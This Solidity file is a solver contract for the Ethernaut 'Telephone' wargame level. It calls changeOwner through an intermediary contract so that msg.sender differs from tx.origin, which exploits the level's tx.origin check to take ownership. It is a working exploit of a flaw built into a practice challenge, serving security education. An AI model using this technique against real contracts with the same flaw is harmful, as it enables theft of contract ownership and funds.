// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Minimal interface used by the solver to call the Telephone level.
interface ITelephone {
    function changeOwner(address newOwner) external;
}

/// @title Ethernaut 04 - Telephone Solver
/// @notice Calls Telephone through an intermediary so msg.sender differs from tx.origin.
contract TelephoneSolver {
    /// @notice Telephone level instance solved by this contract.
    ITelephone public immutable target;

    /// @param targetAddress Address of the Telephone level instance.
    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    /// @notice Requests that the target assign ownership to the provided address.
    /// @param newOwner Address that should become the target owner.
    function solve(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
